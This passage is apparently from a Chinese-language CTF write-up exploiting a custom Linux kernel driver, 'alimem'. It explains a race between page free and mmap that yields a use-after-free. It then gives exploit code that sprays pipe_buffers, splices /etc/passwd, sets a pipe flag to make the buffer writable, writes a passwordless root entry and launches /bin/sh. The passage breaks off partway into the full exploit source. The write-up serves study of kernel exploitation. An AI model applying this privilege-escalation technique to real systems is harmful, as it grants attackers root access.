class="line">        kfree(new_page);</span><br><span class="line">        <span class="keyword">return</span> -ENOSPC;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">case</span> ALIMEM_FREE: &#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">alimem_page</span> *<span class="title">old</span>;</span></span><br><span class="line">    </span><br><span class="line">        <span class="keyword">if</span> (get_user(idx, (<span class="type">int</span> __user *)arg)) <span class="keyword">return</span> -EFAULT;</span><br><span class="line">        <span class="keyword">if</span> (idx &lt; <span class="number">0</span> || idx &gt;= MAX_PAGES) <span class="keyword">return</span> -EINVAL;</span><br><span class="line">    </span><br><span class="line">        down_write(&amp;pages_lock);</span><br><span class="line">        old = pages[idx];</span><br><span class="line">        <span class="keyword">if</span> (old) &#123;</span><br><span class="line">            rcu_assign_pointer(pages[idx], <span class="literal">NULL</span>);</span><br><span class="line">            <span class="keyword">if</span> (atomic_dec_and_test(&amp;old-&gt;refcount)) &#123;</span><br><span class="line">                <span class="built_in">memset</span>(old-&gt;virt, <span class="number">0</span>, PAGE_SIZE);</span><br><span class="line">                call_rcu(&amp;old-&gt;rcu, free_page_rcu);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        up_write(&amp;pages_lock);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">case</span> ALIMEM_WRITE: &#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">alimem_write</span> <span class="title">wr</span>;</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">alimem_page</span> *<span class="title">page</span>;</span></span><br><span class="line">    </span><br><span class="line">        <span class="keyword">if</span> (copy_from_user(&amp;wr, (<span class="type">void</span> __user *)arg, <span class="keyword">sizeof</span>(wr)))</span><br><span class="line">            <span class="keyword">return</span> -EFAULT;</span><br><span class="line">    </span><br><span class="line">        <span class="keyword">if</span> (wr.idx &lt; <span class="number">0</span> || wr.idx &gt;= MAX_PAGES || </span><br><span class="line">            wr.offset + wr.size &gt; PAGE_SIZE)</span><br><span class="line">            <span class="keyword">return</span> -EINVAL;</span><br><span class="line">    </span><br><span class="line">        rcu_read_lock();</span><br><span class="line">        page = rcu_dereference(pages[wr.idx]);</span><br><span class="line">        <span class="keyword">if</span> (!page) &#123;</span><br><span class="line">            rcu_read_unlock();</span><br><span class="line">            <span class="keyword">return</span> -EFAULT;</span><br><span class="line">        &#125;</span><br><span class="line">    </span><br><span class="line">        <span class="keyword">if</span> (copy_from_user(page-&gt;virt + wr.offset, wr.data, wr.size)) &#123;</span><br><span class="line">            rcu_read_unlock();</span><br><span class="line">            <span class="keyword">return</span> -EFAULT;</span><br><span class="line">        &#125;</span><br><span class="line">        rcu_read_unlock();</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">case</span> ALIMEM_READ: &#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">alimem_read</span> <span class="title">rd</span>;</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">alimem_page</span> *<span class="title">page</span>;</span></span><br><span class="line">    </span><br><span class="line">        <span class="keyword">if</span> (copy_from_user(&amp;rd, (<span class="type">void</span> __user *)arg, <span class="keyword">sizeof</span>(rd)))</span><br><span class="line">            <span class="keyword">return</span> -EFAULT;</span><br><span class="line">    </span><br><span class="line">        <span class="keyword">if</span> (rd.idx &lt; <span class="number">0</span> || rd.idx &gt;= MAX_PAGES || </span><br><span class="line">            rd.offset + rd.size &gt; PAGE_SIZE)</span><br><span class="line">            <span class="keyword">return</span> -EINVAL;</span><br><span class="line">    </span><br><span class="line">        rcu_read_lock();</span><br><span class="line">        page = rcu_dereference(pages[rd.idx]);</span><br><span class="line">        <span class="keyword">if</span> (!page) &#123;</span><br><span class="line">            rcu_read_unlock();</span><br><span class="line">            <span class="keyword">return</span> -EFAULT;</span><br><span class="line">        &#125;</span><br><span class="line">    </span><br><span class="line">        <span class="keyword">if</span> (copy_to_user(rd.data, page-&gt;virt + rd.offset, rd.size)) &#123;</span><br><span class="line">            rcu_read_unlock();</span><br><span class="line">            <span class="keyword">return</span> -EFAULT;</span><br><span class="line">        &#125;</span><br><span class="line">        rcu_read_unlock();</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">return</span> -ENOTTY;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​	该 alimem_ioctl 函数通过处理 ALIMEM_ALLOC、ALIMEM_FREE、ALIMEM_WRITE 和 ALIMEM_READ 四个控制命令，实现了对内核物理内存页的动态分配、释放及用户态数据的读写操作：在分配时，通过 __get_free_pages 申请物理内存页并记录其虚拟与物理地址，利用自旋锁保护全局页表 pages 的更新，确保线程安全地插入空闲索引位；释放时通过原子引用计数和 RCU 机制延迟回收内存，避免并发访问冲突；读写操作则在验证索引与偏移合法性后，直接通过 copy_from_user 和 copy_to_user 在内核页与用户缓冲区之间传输数据，绕过传统文件读写的数据复制开销。整个过程通过 pages_lock 写锁与 RCU 读锁的协同，保障多线程环境下页表访问的原子性与一致性，同时借助引用计数和内存清零（memset）确保资源安全释放，最终实现用户态程序对设备内存的高效零拷贝访问。</p>
<p>​	但是漏洞主要发生的问题在于在free的时候由于没有加入rcu的读锁，导致我们可以在多线程竞争的情况下不断地free，如果在mmap获取引用和自增refcount之间的这段时间里面free掉了这个页面，那么我们就可以成功的mmap到之前free的一个页面，之后再利用pipe_buffer的分配就可以实现漏洞的利用了。</p>
<h1 id="三-漏洞利用"><a href="#三-漏洞利用" class="headerlink" title="三.漏洞利用"></a>三.漏洞利用</h1><h3 id="3-1-uaf构造"><a href="#3-1-uaf构造" class="headerlink" title="3.1 uaf构造"></a>3.1 uaf构造</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">check_zero</span><span class="params">(<span class="type">void</span> *addr)</span> &#123;</span><br><span class="line">    <span class="type">char</span> *p = (<span class="type">char</span>*)addr;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PAGE_SIZE; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (p[i] != <span class="number">0</span>) <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">atomic_store</span>(&amp;uaf_detected, <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span>* <span class="title function_">mapper_thread</span><span class="params">(<span class="type">void</span> *arg)</span> &#123;</span><br><span class="line">    <span class="type">int</span> idx = *(<span class="type">int</span>*)arg;</span><br><span class="line">    addr = mmap(<span class="literal">NULL</span>, PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_SHARED, fd, idx * PAGE_SIZE);</span><br><span class="line">    usleep(<span class="number">500</span>);</span><br><span class="line">    <span class="keyword">if</span> (addr != MAP_FAILED) &#123;</span><br><span class="line">        usleep(<span class="number">50000</span>);</span><br><span class="line">        check_zero(addr);</span><br><span class="line">        <span class="keyword">if</span>(!uaf_detected)</span><br><span class="line">            munmap(addr, PAGE_SIZE);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​	首先讲一下check_zero函数和mapper_thread函数，这两个函数主要是对于上述所说的多线程竞争的主要实现，首先通过传入的id，来利用mmap函数分配虚拟设备中的内存，之后sleep一段时间，这段时间位于后面的usleep(50)多一些，使得后面可以不断的free，尝试再mmap获取到引用之后进行free。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">write_pattern</span><span class="params">(<span class="type">int</span> idx)</span> &#123;</span><br><span class="line">    <span class="type">char</span> buf[PAGE_SIZE];</span><br><span class="line">    <span class="built_in">memset</span>(buf, PATTERN, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">alimem_write</span> <span class="title">wr</span> =</span> &#123;</span><br><span class="line">        .idx = idx,</span><br><span class="line">        .offset = <span class="number">0</span>,</span><br><span class="line">        .data = buf,</span><br><span class="line">        .size = <span class="keyword">sizeof</span>(buf)</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">if</span> (ioctl(fd, ALIMEM_WRITE, &amp;wr) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;write error&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​	对于wirte_pattern就是利用ioctl的write进行写，这里为了方便就是都覆盖为PATTERN也就是0xAA，这样后面再进行读取的时候直接check_zero，如果页面全为0了就说明这个页面已经被释放了。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> idx, attempt = <span class="number">0</span>;</span><br><span class="line">    <span class="type">pthread_t</span> tid;</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; PIPE_NUM; i++)&#123;</span><br><span class="line">    <span class="keyword">if</span>(pipe(pipe_fd[i]) &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        perror(<span class="string">&quot;pipe&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ((fd = open(DEV_PATH, O_RDWR)) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">    perror(<span class="string">&quot;device open failed&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[+] Start to trigger racing bug...\n&quot;</span>);</span><br><span class="line"><span class="keyword">while</span> (!<span class="type">atomic_load</span>(&amp;uaf_detected) &amp;&amp; attempt++ &lt; MAX_ATTEMPTS) &#123;</span><br><span class="line">    idx = ioctl(fd, ALIMEM_ALLOC);</span><br><span class="line">    <span class="keyword">if</span> (idx &lt; <span class="number">0</span>) <span class="keyword">continue</span>;</span><br><span class="line">    write_pattern(idx);</span><br><span class="line">    </span><br><span class="line">    pthread_create(&amp;tid, <span class="literal">NULL</span>, mapper_thread, &amp;idx);</span><br><span class="line">    usleep(<span class="number">50</span>); <span class="comment">// 精确控制竞争窗⼝</span></span><br><span class="line">    ioctl(fd, ALIMEM_FREE, &amp;idx);</span><br><span class="line">    </span><br><span class="line">    pthread_join(tid, <span class="literal">NULL</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (attempt) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[+] try %d times...\r&quot;</span>, attempt);</span><br><span class="line">        fflush(<span class="built_in">stdout</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="type">atomic_load</span>(&amp;uaf_detected)) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n[+] UAF detected, try times: %d\n&quot;</span>, attempt);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n[-] UAF detected error\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​	之后就是对于整个攻击流程的讲解，这里首先就是利用了pipe创建一定数目的pipe_buffer，提前创建防止后面alloc之后产生噪声，之后就是打开驱动文件，之后利用atomic_load原子操作来读取uaf_detected变量，主要是识别是否已经出现uaf的页面了，不断进行尝试，free以及mmap，这样如果出现之前所说的在mmap获取引用和refcount自增之前free掉了这个页面就可以获得到一个UAF的页面，可以进行下一步的攻击。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PIPE_NUM; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span>(fcntl(pipe_fd[i][<span class="number">1</span>], F_SETPIPE_SZ, <span class="number">4</span> * <span class="number">0x1000</span>) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            perror(<span class="string">&quot;fcntl&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> target_fd = open(<span class="string">&quot;/etc/passwd&quot;</span>, O_RDONLY);</span><br><span class="line"><span class="keyword">if</span>(target_fd &lt; <span class="number">0</span>)&#123;</span><br><span class="line">    perror(<span class="string">&quot;open&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; PIPE_NUM; i++)&#123;</span><br><span class="line">    <span class="type">loff_t</span> offset = i;</span><br><span class="line">    <span class="type">ssize_t</span> nbytes = splice(target_fd, &amp;offset, pipe_fd[i][<span class="number">1</span>], <span class="literal">NULL</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (nbytes &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;splice failed&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> EXIT_FAILURE;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​	之后就是利用fcntl对于pipe_buffer实现修改大小，将其修改成4k也就是一个页面的大小，这样就有概率申请到我们之前释放掉的page页面，然后就是通过只读的方式读取&#x2F;etc&#x2F;passwd，利用循环给&#x2F;etc&#x2F;passwd和之前申请的管道创建splice，方便后面我们直接通过管道就可以修改&#x2F;etc&#x2F;passwd文件的内容。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> *ptr = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> found = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> ((ptr = memmem(addr, <span class="number">0x1000</span>, <span class="string">&quot;\xff\xff&quot;</span>, <span class="number">2</span>))) &#123;</span><br><span class="line">        hexdump(ptr - <span class="number">6</span>, <span class="number">0x40</span>);</span><br><span class="line">        found = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (found) &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> *<span class="title">pp</span> =</span> (<span class="keyword">struct</span> pipe_buffer *)(ptr - <span class="number">6</span>);</span><br><span class="line">    pp-&gt;len = <span class="number">0</span>;</span><br><span class="line">    pp-&gt;offset = <span class="number">0</span>;</span><br><span class="line">    pp-&gt;flags |= <span class="number">0x10</span>;</span><br><span class="line">    hexdump(ptr - <span class="number">6</span>, <span class="number">0x40</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n[-] UAF pipe_buffer error\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/images/alimem/1741173753507.jpg" alt="1741173753507">	</p>
<p>​	利用memmem函数就是找0x1000长度我们之前获得到的uaf页面中找到第一个出现两个字节”\xff\xff”的位置，这里其实就是找到pipe_buffer结构的第一个指针<strong>page</strong>指针，找到之后减去6就是我们再uaf中写入的pipe_buffer结构体的指针，之后我们将其重新设置长度偏移和flags，也就是让他变的可写。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> *r00t = <span class="string">&quot;root::0:0:root:/root:/bin/sh\n&quot;</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PIPE_NUM; i++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (write(pipe_fd[i][<span class="number">1</span>], r00t, <span class="built_in">strlen</span>(r00t)) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>​	最后就是利用写pipe管道向&#x2F;etc&#x2F;passwd的第一行进行覆盖，使得root用户可以不用密码就可以登录。</p>
<p>​	最终的exp如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;err.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/genetlink.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/kcmp.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/pkt_cls.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/pkt_sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/rtnetlink.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/tc_ematch/tc_em_meta.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdarg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdbool.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/resource.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/uio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/msg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdatomic.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PAGE_SIZE 4096</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DEV_PATH <span class="string">&quot;/dev/alimem&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PATTERN 0xAA</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_ATTEMPTS 100000</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ALIMEM_ALLOC 0x1337</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ALIMEM_FREE 0x1338</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ALIMEM_WRITE 0x1339</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ALIMEM_READ 0x133a</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">alimem_write</span> &#123;</span></span><br><span class="line">    <span class="type">int</span> idx;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> offset;</span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *data;</span><br><span class="line">    <span class="type">size_t</span> size;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">alimem_read</span> &#123;</span></span><br><span class="line">    <span class="type">int</span> idx;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> offset;</span><br><span class="line">    <span class="type">char</span> *data;</span><br><span class="line">    <span class="type">size_t</span> size;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">page</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_inode_info</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buf_operations</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span>;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> offset, len;</span><br><span class="line">    <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">pipe_buf_operations</span> *<span class="title">ops</span>;</span></span><br><span class="line">    <span 